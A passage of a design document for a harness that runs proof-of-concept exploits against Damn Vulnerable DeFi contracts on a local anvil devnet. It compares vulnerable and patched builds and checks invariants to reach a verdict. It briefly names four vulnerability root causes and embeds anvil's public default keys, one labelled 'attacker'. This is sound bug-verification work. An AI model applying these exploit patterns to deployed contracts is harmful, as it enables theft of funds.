# Verifier Harness — Technical Design

> Reusable EVM verification pipeline for running PoC exploits against DVDeFi contracts inside the TEE. Determines whether Voltaire or Foundry CLI (or both) should power each layer.

---

## 1. Voltaire Assessment

### What Voltaire Is

[Voltaire](https://github.com/evmts/voltaire) (v1.1.0 for the Effect package, 0.2.27 for the core) is a multi-language Ethereum primitives toolkit built primarily in Zig with TypeScript bindings. The `voltaire-effect` package wraps it in idiomatic Effect.ts.

### What Voltaire Can Do

| Capability | Status | Details |
|---|---|---|
| Read contract state | Yes | `Provider` service with typed contract calls, ABI decoding |
| Watch events/transactions | Yes | `EventStream`, `TransactionStream` for real-time monitoring |
| Sign transactions | Yes | `LocalAccount`, `JsonRpcAccount` signers |
| EVM execution (local) | Partial | `voltaire-ts` has low-level opcode handlers, `Frame`/`Host` interfaces |
| In-memory blockchain | Yes | `InMemoryBlockchain` layer for local state |
| Fork mode | Yes | `ForkBlockchain` layer for RPC-backed fork |
| Effect.ts integration | Yes | Full DI, typed errors, composable services |
| Contract registry | Yes | Type-safe ABI-based contract interaction |

### What Voltaire Cannot Do

| Capability | Status | Notes |
|---|---|---|
| Compile Solidity | No | No compiler integration. The separate `evmts/compiler` project exists but is not part of Voltaire. |
| Deploy contracts from source | No | No `forge create` equivalent. You would need pre-compiled bytecode. |
| Run Foundry test files | No | No `forge test` equivalent. |
| Manage anvil processes | No | No process orchestration. |
| Snapshot/revert devnet | Not directly | Would need raw `evm_snapshot`/`evm_revert` JSON-RPC calls through the provider. |
| Execute Foundry scripts | No | No `forge script` equivalent. |

### Maturity Assessment

- **Version:** 0.2.27 core / 1.1.0 effect (beta badge in README)
- **Community:** 64 stars, 5 forks, 155 commits
- **Last release:** January 28, 2026 (roughly 7 weeks ago)
- **Dependencies:** `@shazow/whatsabi`, `effect ^3.19`, `@effect/platform ^0.94`
- **Honest verdict:** Voltaire is a **read-heavy library** — excellent for querying state, watching events, and doing typed contract reads. It has nascent EVM execution via Zig bindings but nothing resembling a full devnet or deployment pipeline. It is not a replacement for Foundry.

### Recommendation

**Do not use Voltaire as the primary tool.** Use Foundry CLI (`forge`, `cast`, `anvil`) for compilation, deployment, test execution, and devnet management. Voltaire could optionally be used for typed state reads in invariant checks, but even there, `cast call` through Effect `Command` is simpler and avoids adding a beta dependency.

**Reasoning:**
1. Our verification pipeline is fundamentally about *running Solidity test files* — that is `forge test`. No TypeScript EVM can replace this.
2. DVDeFi v4 is a Foundry project. It compiles with `forge build`, tests run with `forge test`. Fighting this to use a TypeScript EVM would waste days.
3. Voltaire's EVM is opcode-level primitives, not a turnkey execution environment. Wiring it into a full devnet would be a project in itself.
4. Adding a 64-star beta dependency for something `cast call` already does is unnecessary complexity.

---

## 2. Architecture

Five layers, all powered by Foundry CLI wrapped in Effect services.

```
┌─────────────────────────────────────────────────────────┐
│  Layer 5: VerificationPipeline                          │
│  Orchestrates: deploy → check → PoC → check → verdict  │
├─────────────────────────────────────────────────────────┤
│  Layer 4: InvariantChecker                              │
│  Reads state via cast call, compares against registry   │
├─────────────────────────────────────────────────────────┤
│  Layer 3: TransactionRunner                             │
│  Executes PoC: forge test or cast send sequences        │
├─────────────────────────────────────────────────────────┤
│  Layer 2: ContractManager                               │
│  forge build + forge create; manages vuln/patched sets  │
├─────────────────────────────────────────────────────────┤
│  Layer 1: Devnet                                        │
│  anvil process lifecycle, snapshot/revert, RPC URL      │
└─────────────────────────────────────────────────────────┘
```

### Tool selection per layer

| Layer | Primary Tool | Why |
|---|---|---|
| L1: Devnet | `anvil` (CLI) | Only option for local EVM devnet with fork/snapshot support |
| L2: ContractManager | `forge build` + `forge create` | DVDeFi is a Foundry project; compiling outside Foundry is impractical |
| L3: TransactionRunner | `forge test` + `cast send` | PoCs are Foundry test files; `forge test --match-test` is the natural runner |
| L4: InvariantChecker | `cast call` + `cast balance` | Simple state reads; no need for a library |
| L5: Pipeline | Pure Effect orchestration | Composes L1-L4 services; no external tool needed |

---

## 3. DVDeFi Contract Packaging

### Recommendation: Option B — Dedicated Foundry Project

Create `packages/verifier/contracts/` as a standalone Foundry project containing only the contracts we need.

**Why not Option A (fork DVDeFi)?**
- DVDeFi has 18 challenges. We need 4. Forking drags in unnecessary dependencies (Uniswap builds, mainnet fork tests, etc.).
- DVDeFi does not ship patched versions. We need to add them ourselves anyway.

**Why not Option C (Voltaire compile)?**
- Voltaire cannot compile Solidity. This option does not exist.

### Directory structure

```
packages/verifier/
├── contracts/                    # Foundry project root
│   ├── foundry.toml
│   ├── remappings.txt
│   ├── lib/
│   │   └── openzeppelin-contracts/  # git submodule (for ERC20, etc.)
│   └── src/
│       ├── side-entrance/
│       │   ├── SideEntranceLenderPool.sol       # vulnerable (from DVDeFi)
│       │   ├── SideEntranceLenderPoolFixed.sol   # patched (our fix)
│       │   └── interfaces.sol                    # IFlashLoanEtherReceiver
│       ├── truster/
│       │   ├── TrusterLenderPool.sol
│       │   ├── TrusterLenderPoolFixed.sol
│       │   └── DamnValuableToken.sol
│       ├── unstoppable/
│       │   ├── UnstoppableVault.sol
│       │   └── UnstoppableVaultFixed.sol
│       └── naive-receiver/
│           ├── NaiveReceiverPool.sol
│           └── NaiveReceiverPoolFixed.sol
├── src/                          # TypeScript Effect services
│   ├── Devnet.ts                 # Layer 1
│   ├── ContractManager.ts        # Layer 2
│   ├── TransactionRunner.ts      # Layer 3
│   ├── InvariantChecker.ts       # Layer 4
│   ├── VerificationPipeline.ts   # Layer 5
│   ├── InvariantRegistry.ts      # invariant definitions
│   ├── Errors.ts
│   └── index.ts
├── package.json
└── tsconfig.json
```

### Patched versions

For each challenge, we write a minimal fix and include it as `*Fixed.sol`:

| Challenge | Patch Strategy |
|---|---|
| Side Entrance | Add `_flashLoanActive` flag, reject `deposit()` during flash loan |
| Truster | Remove arbitrary `target`/`data` params, use typed callback |
| Unstoppable | Use internal `_totalManagedAssets` instead of `balanceOf` |
| Naive Receiver | Require `msg.sender == address(receiver)` |

These patches are already specified in `bug-disclosure-demo.md` Section 4.

---

## 4. Docker Compose Additions

Anvil runs as a sidecar container in the TEE Docker Compose.

### New services

```yaml
# Added to infra/dstack/docker-compose.yml

  # ── Local EVM Devnet ───────────────────────────────────
  anvil:
    image: ghcr.io/foundry-rs/foundry:latest
    container_name: mnemo-anvil
    entrypoint: ["anvil"]
    command:
      - "--host"
      - "0.0.0.0"
      - "--port"
      - "8545"
      - "--accounts"
      - "10"
      - "--balance"
      - "10000"
      - "--block-time"
      - "1"
      - "--silent"
    ports:
      - "8545:8545"
    networks:
      - mnemo-internal
    healthcheck:
      test: ["CMD", "cast", "block-number", "--rpc-url", "http://localhost:8545"]
      interval: 2s
      timeout: 5s
      retries: 10

  # ── Verifier Harness ───────────────────────────────────
  verifier:
    build:
      context: ../..
      dockerfile: infra/dstack/Dockerfile.verifier
    container_name: mnemo-verifier
    environment:
      - ANVIL_RPC_URL=http://anvil:8545
      - DSTACK_SIMULATOR_ENDPOINT=http://dstack-simulator:8090
    depends_on:
      anvil:
        condition: service_healthy
      dstack-simulator:
        condition: service_started
    volumes:
      # Pre-compiled contract artifacts (built in Dockerfile)
      - verifier-artifacts:/app/contracts/out
    networks:
      - mnemo-internal

volumes:
  verifier-artifacts:
```

### Dockerfile.verifier

```dockerfile
FROM ghcr.io/foundry-rs/foundry:latest AS contracts

WORKDIR /build
COPY packages/verifier/contracts/ .
RUN forge build

# ---

FROM oven/bun:1 AS runtime

WORKDIR /app
COPY packages/verifier/ .
COPY --from=contracts /build/out ./contracts/out
COPY --from=contracts /usr/local/bin/forge /usr/local/bin/forge
COPY --from=contracts /usr/local/bin/cast /usr/local/bin/cast

RUN bun install --frozen-lockfile

CMD ["bun", "run", "src/index.ts"]
```

### Design decisions

1. **Anvil as sidecar (not embedded).** Cleaner separation of concerns. The verifier container does not need the full Foundry toolchain at runtime for anvil — it only needs `forge` and `cast` binaries for compilation and state reads.

2. **Pre-compiled artifacts.** The Dockerfile multi-stage build compiles contracts once. The verifier loads ABI + bytecode from `out/` at runtime. No `forge build` needed during verification.

3. **forge + cast binaries copied into runtime.** We still need `forge test` for running PoC test files and `cast` for state reads. These are statically-linked binaries, so copying them is clean.

4. **Anvil healthcheck via `cast block-number`.** The Foundry image includes `cast`, so the healthcheck verifies RPC is responsive before starting the verifier.

5. **Block time of 1s.** Auto-mining with a 1s block time keeps the devnet responsive while still having distinct blocks (useful for snapshot/revert semantics).

---

## 5. Effect Service Design

### 5.1 Errors

```typescript
// packages/verifier/src/Errors.ts
import { Data } from "effect"

export class DevnetError extends Data.TaggedError("DevnetError")<{
  readonly message: string
  readonly cause?: unknown
}> {}

export class CompilationError extends Data.TaggedError("CompilationError")<{
  readonly message: string
  readonly stderr?: string
}> {}

export class DeploymentError extends Data.TaggedError("DeploymentError")<{
  readonly message: string
  readonly cause?: unknown
}> {}

export class PoCExecutionError extends Data.TaggedError("PoCExecutionError")<{
  readonly message: string
  readonly exitCode: number
  readonly stdout: string
  readonly stderr: string
}> {}

export class InvariantCheckError extends Data.TaggedError("InvariantCheckError")<{
  readonly message: string
  readonly cause?: unknown
}> {}
```

### 5.2 Layer 1: Devnet

```typescript
// packages/verifier/src/Devnet.ts
import { Context, Effect, Layer } from "effect"
import { Command } from "@effect/platform"
import { DevnetError } from "./Errors.js"

export interface DevnetService {
  /** RPC URL for the running anvil instance */
  readonly rpcUrl: string

  /** Take a snapshot of current state. Returns snapshot ID. */
  readonly snapshot: () => Effect.Effect<string, DevnetError>

  /** Revert to a previous snapshot. */
  readonly revert: (snapshotId: string) => Effect.Effect<void, DevnetError>

  /** Get current block number. */
  readonly blockNumber: () => Effect.Effect<number, DevnetError>

  /** Set the ETH balance of an address (anvil cheatcode). */
  readonly setBalance: (
    address: string,
    balanceWei: bigint
  ) => Effect.Effect<void, DevnetError>
}

export class Devnet extends Context.Tag("@mnemo/verifier/Devnet")<
  Devnet,
  DevnetService
>() {}

/** Cast RPC helper — calls anvil JSON-RPC methods via cast. */
const castRpc = (rpcUrl: string, method: string, params: string[] = []) =>
  Command.make("cast", "rpc", "--rpc-url", rpcUrl, method, ...params).pipe(
    Command.string,
    Effect.map((s) => s.trim()),
    Effect.mapError(
      (e) => new DevnetError({ message: `cast rpc ${method} failed`, cause: e })
    )
  )

/**
 * Layer that connects to an existing anvil instance.
 * Expects ANVIL_RPC_URL in environment (default: http://localhost:8545).
 */
export const AnvilLayer: Layer.Layer<Devnet> = Layer.succeed(
  Devnet,
  (() => {
    const rpcUrl = process.env.ANVIL_RPC_URL ?? "http://localhost:8545"

    return {
      rpcUrl,

      snapshot: () =>
        castRpc(rpcUrl, "evm_snapshot").pipe(
          Effect.map((hex) => hex) // returns hex snapshot ID
        ),

      revert: (snapshotId) =>
        castRpc(rpcUrl, "evm_revert", [snapshotId]).pipe(
          Effect.flatMap((result) =>
            result === "true"
              ? Effect.void
              : Effect.fail(
                  new DevnetError({ message: `Revert failed for ${snapshotId}` })
                )
          )
        ),

      blockNumber: () =>
        Command.make("cast", "block-number", "--rpc-url", rpcUrl).pipe(
          Command.string,
          Effect.map((s) => parseInt(s.trim(), 10)),
          Effect.mapError(
            (e) =>
              new DevnetError({ message: "Failed to get block number", cause: e })
          )
        ),

      setBalance: (address, balanceWei) =>
        castRpc(rpcUrl, "anvil_setBalance", [
          address,
          `0x${balanceWei.toString(16)}`,
        ]).pipe(Effect.asVoid),
    } satisfies DevnetService
  })()
)
```

### 5.3 Layer 2: ContractManager

```typescript
// packages/verifier/src/ContractManager.ts
import { Context, Effect, Layer } from "effect"
import { Command, FileSystem } from "@effect/platform"
import { DeploymentError, CompilationError } from "./Errors.js"
import { Devnet } from "./Devnet.js"

export type ContractVersion = "vulnerable" | "patched"

export interface DeployedContract {
  readonly address: string
  readonly txHash: string
  readonly abi: unknown[] // JSON ABI
}

export interface ContractManagerService {
  /** Deploy a challenge contract to the devnet. */
  readonly deploy: (options: {
    readonly challengeId: string
    readonly version: ContractVersion
    readonly constructorArgs?: readonly string[]
    readonly value?: string // ETH to send with deployment
  }) => Effect.Effect<DeployedContract, DeploymentError>

  /** Get the compiled artifact (ABI + bytecode) for a contract. */
  readonly getArtifact: (options: {
    readonly challengeId: string
    readonly version: ContractVersion
  }) => Effect.Effect<{ abi: unknown[]; bytecode: string }, CompilationError>
}

export class ContractManager extends Context.Tag(
  "@mnemo/verifier/ContractManager"
)<ContractManager, ContractManagerService>() {}

/**
 * Contract name mapping: challengeId + version -> Solidity contract path
 */
const CONTRACT_MAP: Record<string, Record<ContractVersion, {
  path: string  // relative to contracts/src
  name: string  // contract name
}>> = {
  "side-entrance": {
    vulnerable: { path: "side-entrance/SideEntranceLenderPool.sol", name: "SideEntranceLenderPool" },
    patched:    { path: "side-entrance/SideEntranceLenderPoolFixed.sol", name: "SideEntranceLenderPoolFixed" },
  },
  "truster": {
    vulnerable: { path: "truster/TrusterLenderPool.sol", name: "TrusterLenderPool" },
    patched:    { path: "truster/TrusterLenderPoolFixed.sol", name: "TrusterLenderPoolFixed" },
  },
  "unstoppable": {
    vulnerable: { path: "unstoppable/UnstoppableVault.sol", name: "UnstoppableVault" },
    patched:    { path: "unstoppable/UnstoppableVaultFixed.sol", name: "UnstoppableVaultFixed" },
  },
  "naive-receiver": {
    vulnerable: { path: "naive-receiver/NaiveReceiverPool.sol", name: "NaiveReceiverPool" },
    patched:    { path: "naive-receiver/NaiveReceiverPoolFixed.sol", name: "NaiveReceiverPoolFixed" },
  },
}

// The default deployer private key — anvil's first default account
const DEPLOYER_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

/**
 * Layer backed by pre-compiled Foundry artifacts.
 * Expects artifacts at CONTRACTS_OUT_DIR (default: ./contracts/out).
 */
export const FoundryLayer = Layer.effect(
  ContractManager,
  Effect.gen(function* () {
    const devnet = yield* Devnet
    const artifactsDir = process.env.CONTRACTS_OUT_DIR ?? "./contracts/out"

    return {
      getArtifact: ({ challengeId, version }) =>
        Effect.gen(function* () {
          const entry = CONTRACT_MAP[challengeId]?.[version]
          if (!entry) {
            return yield* Effect.fail(
              new CompilationError({
                message: `Unknown contract: ${challengeId}/${version}`,
              })
            )
          }

          // Foundry artifact path: out/<ContractName>.sol/<ContractName>.json
          const artifactPath = `${artifactsDir}/${entry.name}.sol/${entry.name}.json`
          const fs = yield* FileSystem.FileSystem
          const raw = yield* fs.readFileString(artifactPath).pipe(
            Effect.mapError(
              (e) =>
                new CompilationError({
                  message: `Artifact not found: ${artifactPath}`,
                  stderr: String(e),
                })
            )
          )
          const artifact = JSON.parse(raw)
          return {
            abi: artifact.abi as unknown[],
            bytecode: artifact.bytecode.object as string,
          }
        }),

      deploy: ({ challengeId, version, constructorArgs, value }) =>
        Effect.gen(function* () {
          const entry = CONTRACT_MAP[challengeId]?.[version]
          if (!entry) {
            return yield* Effect.fail(
              new DeploymentError({
                message: `Unknown contract: ${challengeId}/${version}`,
              })
            )
          }

          const args = [
            "forge", "create",
            "--rpc-url", devnet.rpcUrl,
            "--private-key", DEPLOYER_KEY,
            "--json",
            `src/${entry.path}:${entry.name}`,
          ]

          if (constructorArgs && constructorArgs.length > 0) {
            args.push("--constructor-args", ...constructorArgs)
          }
          if (value) {
            args.push("--value", value)
          }

          const result = yield* Command.make(args[0]!, ...args.slice(1)).pipe(
            Command.string,
            Effect.mapError(
              (e) =>
                new DeploymentError({
                  message: `forge create failed for ${challengeId}/${version}`,
                  cause: e,
                })
            )
          )

          const parsed = JSON.parse(result)
          const artifactPath = `${artifactsDir}/${entry.name}.sol/${entry.name}.json`
          const fs = yield* FileSystem.FileSystem
          const raw = yield* fs.readFileString(artifactPath).pipe(
            Effect.mapError(
              (e) =>
                new DeploymentError({
                  message: `Artifact read failed post-deploy`,
                  cause: e,
                })
            )
          )
          const artifact = JSON.parse(raw)

          return {
            address: parsed.deployedTo as string,
            txHash: parsed.transactionHash as string,
            abi: artifact.abi as unknown[],
          } satisfies DeployedContract
        }),
    } satisfies ContractManagerService
  })
)
```

### 5.4 Layer 3: TransactionRunner

```typescript
// packages/verifier/src/TransactionRunner.ts
import { Context, Effect, Layer } from "effect"
import { Command, FileSystem } from "@effect/platform"
import { PoCExecutionError } from "./Errors.js"
import { Devnet } from "./Devnet.js"

export interface PoCResult {
  readonly exitCode: number
  readonly stdout: string
  readonly stderr: string
  readonly durationMs: number
  readonly passed: boolean
}

export interface TransactionRunnerService {
  /**
   * Run a Foundry test file as a PoC.
   * Writes the test source to a temp file, runs forge test against it.
   */
  readonly runFoundryTest: (options: {
    readonly testSource: string     // Solidity source code
    readonly testContract?: string  // contract name (default: inferred)
    readonly testFunction?: string  // function name (default: all)
    readonly verbosity?: number     // -v count (default: 3 for -vvv)
    readonly timeoutSeconds?: number
  }) => Effect.Effect<PoCResult, PoCExecutionError>

  /**
   * Run a sequence of cast transactions as a PoC.
   * Each step is a cast send or cast call.
   */
  readonly runCastSequence: (options: {
    readonly steps: ReadonlyArray<{
      readonly type: "send" | "call"
      readonly to: string
      readonly sig: string
      readonly args?: readonly string[]
      readonly value?: string
      readonly privateKey?: string
    }>
    readonly timeoutSeconds?: number
  }) => Effect.Effect<PoCResult, PoCExecutionError>
}

export class TransactionRunner extends Context.Tag(
  "@mnemo/verifier/TransactionRunner"
)<TransactionRunner, TransactionRunnerService>() {}

const DEPLOYER_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
// Second anvil default account — used as the "attacker" in PoCs
const ATTACKER_KEY = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"

export const FoundryLayer = Layer.effect(
  TransactionRunner,
  Effect.gen(function* () {
    const devnet = yield* Devnet
    const fs = yield* FileSystem.FileSystem
    const contractsRoot = process.env.CONTRACTS_ROOT ?? "./contracts"

    return {
      runFoundryTest: ({ testSource, testFunction, verbosity = 3, timeoutSeconds = 60 }) =>
        Effect.gen(function* () {
          // Write PoC to a temp test file inside the contracts project
          const pocPath = `${contractsRoot}/test/PoC.t.sol`
          yield* fs.writeFileString(pocPath, testSource).pipe(
            Effect.mapError(
              (e) =>
                new PoCExecutionError({
                  message: "Failed to write PoC file",
                  exitCode: -1,
                  stdout: "",
                  stderr: String(e),
                })
            )
          )

          const args = [
            "forge", "test",
            "--root", contractsRoot,
            "--rpc-url", devnet.rpcUrl,
            "-" + "v".repeat(verbosity),
          ]

          if (testFunction) {
            args.push("--match-test", testFunction)
          }
          // Always match only our PoC file
          args.push("--match-path", "test/PoC.t.sol")

          const startTime = Date.now()

          // Run forge test — we do NOT fail on non-zero exit code
          // because a "passing" PoC against a vulnerable contract
          // may have assertions that pass (exploit succeeded)
          const result = yield* Command.make(args[0]!, ...args.slice(1)).pipe(
            Command.string,
            Effect.map((stdout) => ({
              exitCode: 0,
              stdout,
              stderr: "",
              durationMs: Date.now() - startTime,
              passed: true,
            })),
            Effect.catchAll((e: any) =>
              Effect.succeed({
                exitCode: e.exitCode ?? 1,
                stdout: e.stdout ?? "",
                stderr: e.stderr ?? String(e),
                durationMs: Date.now() - startTime,
                passed: false,
              })
            )
          )

          // Clean up
          yield* fs.remove(pocPath).pipe(Effect.ignore)

          return result satisfies PoCResult
        }),

      runCastSequence: ({ steps, timeoutSeconds = 60 }) =>
        Effect.gen(function* () {
          const startTime = Date.now()
          const outputs: string[] = []

          for (const step of steps) {
            const key = step.privateKey ?? ATTACKER_KEY
            const args =
              step.type === "send"
                ? [
                    "cast", "send",
                    "--rpc-url", devnet.rpcUrl,
                    "--private-key", key,
                    step.to,
                    step.sig,
                    ...(step.args ?? []),
                    ...(step.value ? ["--value", step.value] : []),
                  ]
                : [
                    "cast", "call",
                    "--rpc-url", devnet.rpcUrl,
                    step.to,
                    step.sig,
                    ...(step.args ?? []),
                  ]

            const output = yield* Command.make(args[0]!, ...args.slice(1)).pipe(
              Command.string,
              Effect.mapError(
                (e) =>
                  new PoCExecutionError({
                    message: `cast ${step.type} failed: ${step.sig}`,
                    exitCode: 1,
                    stdout: outputs.join("\n"),
                    stderr: String(e),
                  })
              )
            )
            outputs.push(output.trim())
          }

          return {
            exitCode: 0,
            stdout: outputs.join("\n"),
            stderr: "",
            durationMs: Date.now() - startTime,
            passed: true,
          } satisfies PoCResult
        }),
    } satisfies TransactionRunnerService
  })
)
```

### 5.5 Layer 4: InvariantChecker

```typescript
// packages/verifier/src/InvariantChecker.ts
import { Context, Effect, Layer } from "effect"
import { Command } from "@effect/platform"
import { InvariantCheckError } from "./Errors.js"
import { Devnet } from "./Devnet.js"

export type Severity = "critical" | "high" | "medium" | "low" | "informational"

export interface InvariantResult {
  readonly invariantId: string
  readonly holds: boolean
  readonly expected: string
  readonly actual: string
  readonly severity: Severity
  readonly description: string
}

export interface InvariantCheckerService {
  /** Check a specific invariant against the current devnet state. */
  readonly check: (options: {
    readonly challengeId: string
    readonly invariantId: string
    readonly contractAddress: string
    readonly params?: Record<string, string>
  }) => Effect.Effect<InvariantResult, InvariantCheckError>

  /** Check all invariants for a challenge. */
  readonly checkAll: (options: {
    readonly challengeId: string
    readonly contractAddress: string
    readonly params?: Record<string, string>
  }) => Effect.Effect<readonly InvariantResult[], InvariantCheckError>

  /** List available invariants for a challenge. */
  readonly list: (
    challengeId: string
  ) => Effect.Effect<
    ReadonlyArray<{ id: string; description: string; severity: Severity }>
  >
}

export class InvariantChecker extends Context.Tag(
  "@mnemo/verifier/InvariantChecker"
)<InvariantChecker, InvariantCheckerService>() {}

// --- Invariant registry (see InvariantRegistry.ts for full definitions) ---

type InvariantDef = {
  readonly id: string
  readonly description: string
  readonly severity: Severity
  readonly check: (ctx: {
    rpcUrl: string
    contractAddress: string
    params: Record<string, string>
  }) => Effect.Effect<{ holds: boolean; expected: string; actual: string }, InvariantCheckError>
}

const castCall = (rpcUrl: string, to: string, sig: string, args: string[] = []) =>
  Command.make("cast", "call", "--rpc-url", rpcUrl, to, sig, ...args).pipe(
    Command.string,
    Effect.map((s) => s.trim()),
    Effect.mapError(
      (e) => new InvariantCheckError({ message: `cast call failed: ${sig}`, cause: e })
    )
  )

const castBalance = (rpcUrl: string, address: string) =>
  Command.make("cast", "balance", "--rpc-url", rpcUrl, address).pipe(
    Command.string,
    Effect.map((s) => BigInt(s.trim())),
    Effect.mapError(
      (e) => new InvariantCheckError({ message: `cast balance failed`, cause: e })
    )
  )

const INVARIANTS: Record<string, InvariantDef[]> = {
  "side-entrance": [
    {
      id: "pool-balance-gte-deposits",
      description: "Pool ETH balance must be >= initial deposit (1000 ETH)",
      severity: "critical",
      check: ({ rpcUrl, contractAddress, params }) =>
        Effect.gen(function* () {
          const balance = yield* castBalance(rpcUrl, contractAddress)
          const expected = BigInt(params.initialDeposit ?? "1000000000000000000000") // 1000 ETH
          return {
            holds: balance >= expected,
            expected: `>= ${expected.toString()} wei`,
            actual: `${balance.toString()} wei`,
          }
        }),
    },
  ],
  "truster": [
    {
      id: "pool-token-balance",
      description: "Pool must retain all tokens after flash loan",
      severity: "critical",
      check: ({ rpcUrl, contractAddress, params }) =>
        Effect.gen(function* () {
          const tokenAddress = params.tokenAddress!
          const result = yield* castCall(
            rpcUrl, tokenAddress,
            "balanceOf(address)(uint256)", [contractAddress]
          )
          const balance = BigInt(result)
          const expected = BigInt(params.initialBalance ?? "1000000000000000000000000") // 1M tokens
          return {
            holds: balance >= expected,
            expected: `>= ${expected.toString()}`,
            actual: balance.toString(),
          }
        }),
    },
  ],
  "unstoppable": [
    {
      id: "flash-loan-available",
      description: "Flash loan function must not revert (vault is 'unstoppable')",
      severity: "medium",
      check: ({ rpcUrl, contractAddress, params }) =>
        Effect.gen(function* () {
          const tokenAddress = params.tokenAddress!
          const result = yield* castCall(
            rpcUrl, contractAddress,
            "maxFlashLoan(address)(uint256)", [tokenAddress]
          ).pipe(
            Effect.map((r) => ({ holds: true, actual: r })),
            Effect.catchAll(() =>
              Effect.succeed({ holds: false, actual: "REVERTED" })
            )
          )
          return {
            holds: result.holds,
            expected: "callable (no revert)",
            actual: result.actual,
          }
        }),
    },
  ],
  "naive-receiver": [
    {
      id: "receiver-balance-unchanged",
      description: "Receiver deposits only change via receiver's own actions",
      severity: "high",
      check: ({ rpcUrl, contractAddress, params }) =>
        Effect.gen(function* () {
          const receiverAddress = params.receiverAddress!
          const result = yield* castCall(
            rpcUrl, contractAddress,
            "deposits(address)(uint256)", [receiverAddress]
          )
          const balance = BigInt(result)
          const expected = BigInt(params.initialReceiverBalance ?? "10000000000000000000") // 10 ETH
          return {
            holds: balance >= expected,
            expected: `>= ${expected.toString()}`,
            actual: balance.toString(),
          }
        }),
    },
  ],
}

export const RegistryLayer = Layer.effect(
  InvariantChecker,
  Effect.gen(function* () {
    const devnet = yield* Devnet

    return {
      check: ({ challengeId, invariantId, contractAddress, params }) =>
        Effect.gen(function* () {
          const defs = INVARIANTS[challengeId]
          if (!defs) {
            return yield* Effect.fail(
              new InvariantCheckError({
                message: `No invariants registered for challenge: ${challengeId}`,
              })
            )
          }
          const def = defs.find((d) => d.id === invariantId)
          if (!def) {
            return yield* Effect.fail(
              new InvariantCheckError({
                message: `Unknown invariant: ${challengeId}/${invariantId}`,
              })
            )
          }

          const result = yield* def.check({
            rpcUrl: devnet.rpcUrl,
            contractAddress,
            params: params ?? {},
          })

          return {
            invariantId: def.id,
            holds: result.holds,
            expected: result.expected,
            actual: result.actual,
            severity: def.severity,
            description: def.description,
          } satisfies InvariantResult
        }),

      checkAll: ({ challengeId, contractAddress, params }) =>
        Effect.gen(function* () {
          const defs = INVARIANTS[challengeId]
          if (!defs) {
            return yield* Effect.fail(
              new InvariantCheckError({
                message: `No invariants registered for challenge: ${challengeId}`,
              })
            )
          }

          return yield* Effect.all(
            defs.map((def) =>
              def
                .check({
                  rpcUrl: devnet.rpcUrl,
                  contractAddress,
                  params: params ?? {},
                })
                .pipe(
                  Effect.map((result) => ({
                    invariantId: def.id,
                    holds: result.holds,
                    expected: result.expected,
                    actual: result.actual,
                    severity: def.severity,
                    description: def.description,
                  }))
                )
            ),
            { concurrency: "unbounded" }
          )
        }),

      list: (challengeId) =>
        Effect.succeed(
          (INVARIANTS[challengeId] ?? []).map((d) => ({
            id: d.id,
            description: d.description,
            severity: d.severity,
          }))
        ),
    } satisfies InvariantCheckerService
  })
)
```

### 5.6 Layer 5: VerificationPipeline

```typescript
// packages/verifier/src/VerificationPipeline.ts
import { Context, Effect, Layer } from "effect"
import { Devnet } from "./Devnet.js"
import { ContractManager, type ContractVersion } from "./ContractManager.js"
import { TransactionRunner, type PoCResult } from "./TransactionRunner.js"
import { InvariantChecker, type InvariantResult, type Severity } from "./InvariantChecker.js"

export type Verdict = "VALID_BUG" | "INVALID" | "TEST_ARTIFACT" | "ERROR"

export interface VerificationResult {
  readonly verdict: Verdict
  readonly severity: Severity | null
  readonly challengeId: string
  readonly prePoC: readonly InvariantResult[]
  readonly postPoC: readonly InvariantResult[]
  readonly postPoCPatched: readonly InvariantResult[] | null
  readonly pocExecution: PoCResult
  readonly pocExecutionPatched: PoCResult | null
  readonly durationMs: number
  readonly summary: string
}

export interface VerificationPipelineService {
  /**
   * Run the full verification pipeline:
   *  1. Deploy vulnerable contract
   *  2. Check invariants (should hold)
   *  3. Run PoC
   *  4. Check invariants (should break if valid bug)
   *  5. Deploy patched contract
   *  6. Run same PoC against patched
   *  7. Check invariants (should hold if real fix)
   *  8. Return verdict
   */
  readonly verify: (options: {
    readonly challengeId: string
    readonly pocSource: string       // Solidity test source
    readonly pocFunction?: string    // test function name
    readonly params?: Record<string, string>
  }) => Effect.Effect<
    VerificationResult,
    DevnetError | DeploymentError | PoCExecutionError | InvariantCheckError
  >
}

export class VerificationPipeline extends Context.Tag(
  "@mnemo/verifier/VerificationPipeline"
)<VerificationPipeline, VerificationPipelineService>() {}

export const PipelineLayer = Layer.effect(
  VerificationPipeline,
  Effect.gen(function* () {
    const devnet = yield* Devnet
    const contracts = yield* ContractManager
    const runner = yield* TransactionRunner
    const checker = yield* InvariantChecker

    return {
      verify: ({ challengeId, pocSource, pocFunction, params }) =>
        Effect.gen(function* () {
          const startTime = Date.now()

          // --- Phase 1: Vulnerable contract ---
          yield* Effect.log(`[Pipeline] Deploying ${challengeId} (vulnerable)`)
          const vulnContract = yield* contracts.deploy({
            challengeId,
            version: "vulnerable",
            value: params?.deployValue,
            constructorArgs: params?.constructorArgs
              ? JSON.parse(params.constructorArgs)
              : undefined,
          })

          // Snapshot for revert
          const snapshotId = yield* devnet.snapshot()

          // Pre-PoC invariant check
          yield* Effect.log("[Pipeline] Checking pre-PoC invariants")
          const prePoC = yield* checker.checkAll({
            challengeId,
            contractAddress: vulnContract.address,
            params: { ...params, contractAddress: vulnContract.address },
          })

          const prePoCAllHold = prePoC.every((r) => r.holds)
          if (!prePoCAllHold) {
            return {
              verdict: "ERROR" as Verdict,
              severity: null,
              challengeId,
              prePoC,
              postPoC: [],
              postPoCPatched: null,
              pocExecution: {
                exitCode: -1,
                stdout: "",
                stderr: "Pre-PoC invariants already broken",
                durationMs: 0,
                passed: false,
              },
              pocExecutionPatched: null,
              durationMs: Date.now() - startTime,
              summary: "Pre-PoC invariants did not hold — deployment or setup error.",
            } satisfies VerificationResult
          }

          // Run PoC against vulnerable
          yield* Effect.log("[Pipeline] Running PoC against vulnerable contract")
          const pocResult = yield* runner.runFoundryTest({
            testSource: pocSource,
            testFunction: pocFunction,
            verbosity: 3,
            timeoutSeconds: 60,
          })

          // Post-PoC invariant check
          yield* Effect.log("[Pipeline] Checking post-PoC invariants")
          const postPoC = yield* checker.checkAll({
            challengeId,
            contractAddress: vulnContract.address,
            params: { ...params, contractAddress: vulnContract.address },
          })

